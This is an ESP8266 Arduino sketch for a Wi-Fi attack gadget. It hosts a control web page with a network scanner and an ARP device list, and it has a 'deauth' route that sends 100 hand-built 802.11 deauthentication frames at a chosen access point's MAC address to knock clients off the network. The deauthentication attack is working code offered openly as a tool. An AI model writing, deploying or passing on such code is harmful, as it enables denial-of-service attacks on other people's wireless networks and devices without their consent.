#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <lwip/etharp.h>

// AP Credentials
const char* ap_ssid = "ESP8266";
const char* ap_password = "1234567890";

// Start HTTP Server
ESP8266WebServer server(80);

// Deauth Variables
String targetSSID = "";
int targetChannel = 1;
uint8_t targetMac[6];

// SSID and Pass to Connect a AP
String ssid;
String password;

// AP Settings
void setupAP() {
  Serial.println("Starting AP...");
  WiFi.softAP(ap_ssid, ap_password);

  // HTTP Server Routes
  server.on("/", handleRoot);
  server.on("/connect", handleWifiConnect);
  server.on("/submit", HTTP_POST, handleSubmit);
  server.on("/scanner", handleWifiScanner);
  server.on("/deauth", handleAttackDeauth);
  server.on("/arp", handleARP);
  server.begin();


  Serial.println("HTTP Server Started...");
}

void handleRoot() {
  String htmlRoot = "<html><head><title>Esp8266 | Root</title><style>html {background-color: black;color: purple;display: flex;}a {color: red;}</style></head><body><h1>Esp8266 : Settings</h1><h2>Pages : </h2><a href='/connect'>AP Connection</a><br><a href='/scanner'>AP Scanner</a><br><a href='/arp'>ARP Scanner</a><br></body></html>";
  server.send(200, "text/html", htmlRoot);
}

void handleWifiConnect() {
  String htmlConnection = "<html><head><title>Esp8266 | AP Connect</title><style>html {background-color: black;color: purple;}input {background-color: black;color: purple;}</style></head><body><h1>AP Connection Config</h1><form action='/submit' method='POST'>SSID : <input type='text' name='ssid'><br>Pass : <input type='text' name='password'><br><input type='submit' value='Connect'></form></body></html>";
  server.send(200, "text/html", htmlConnection);
}

void handleSubmit() {
  ssid = server.arg("ssid");
  password = server.arg("password");

  String message = "Trying to Connect SSID : " + ssid;
  server.send(200, "text/html", message);

  delay(1000);
  WiFi.softAPdisconnect(true);
  connectToWiFi();
}

// Connect Esp8266 to AP
void connectToWiFi() {
  WiFi.begin(ssid.c_str(), password.c_str());

  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    delay(500);
    Serial.print(".");
    attempts++;
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\nConnected to AP");
    startWebServer();
  } else {
    Serial.println("Fail to Connect a AP");
    setupAP();
  }
}

void startWebServer() {
  server.on("/", []() {
    server.send(200, "text/html", "<h1>Connected to AP!</h1>");
  });
  server.begin();
  Serial.println("HTTP Server Started!");
}

void handleWifiScanner() {
  int numNetworks = WiFi.scanNetworks();
  String htmlScan = "<html><head><title>Esp8266 | AP Scan</title><style>html {background-color: black;color: purple;}a {color: red;}</style></head><body><h1>Close APs</h1><ul>";

  for (int i = 0; i < numNetworks; i++) {
    htmlScan += "<li><a href='/deauth?ssid=" + WiFi.SSID(i) + "&channel=" + String(WiFi.channel(i)) + "&mac=" + WiFi.BSSIDstr(i) + "'>" + WiFi.SSID(i) +" (Channel " + String(WiFi.channel(i)) + ")</a></li>";
  }

  htmlScan += "</ul></body></html>";

  server.send(200, "text/html", htmlScan);
}

void handleARP() {
  String htmlArp = "<html><head><title>Esp8266 | ARP</title><style>html {background-color: black;color: purple;}</style></head><body>";
  htmlArp += "<h1>Connected Devices : </h1><table border='1'><tr><th>IPv4</th><th>MAC Address</th></tr>";

  size_t i = 0;
  ip4_addr_t *ipaddr;
  struct netif *netif;
  struct eth_addr *eth_ret;

  // Loop to Verify Connected Devices
  while (etharp_get_entry(i, &ipaddr, &netif, &eth_ret) == 1) {
    if (ipaddr != NULL && eth_ret != NULL) {
      htmlArp += "<tr><td>";
      htmlArp += IPAddress(ipaddr->addr).toString();
      htmlArp += "</td><td>";
      htmlArp += formatMacAddress(eth_ret->addr);
      htmlArp += "</td></tr>";
    }
    i++;
  }

  htmlArp += "</table></body></html>";

  server.send(200, "text/html", htmlArp);
}

void deauthAttack(uint8_t *targetMac) {
  for (int i = 0; i < 100; i++) {
    sendDeauthFrame(targetMac);
    delay(10);
  }
}

void sendDeauthFrame(uint8_t *targetMac) {
  uint8_t deauthPacket[] = {
    0xC0, 0x00, 0x3A, 0x01,
    targetMac[0], targetMac[1], targetMac[2],
    targetMac[3], targetMac[4], targetMac[5],
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00,
    0x07, 0x00
  };
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
}

// Start Deauth Attack
void handleAttackDeauth() {
  if (server.hasArg("ssid") && server.hasArg("channel") && server.hasArg("mac")) {
    targetSSID = server.arg("ssid");
    targetChannel = server.arg("channel").toInt();
    String macStr = server.arg("mac");

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &targetMac[0], &targetMac[1], &targetMac[2], &targetMac[3], &targetMac[4], &targetMac[5]);

    wifi_set_channel(targetChannel);
    deauthAttack(targetMac);

    server.send(200, "text/html", "<html><body><h1>Attacking : " + targetSSID + "</h1></body></html>");
  } else {
    server.send(400, "text/html", "Invalid Params");
  }
}

String formatMacAddress(uint8_t *mac) {
  String macStr = "";
  for (int i = 0; i < 6; i++) {
    if (mac[i] < 0x10) {
      macStr += "0";
    }
    macStr += String(mac[i], HEX);
    if (i < 5) {
      macStr += ":";
    }
  }
  return macStr;
}


void setup() {
  Serial.begin(115200);
  setupAP();
}

void loop() {
  server.handleClient();
}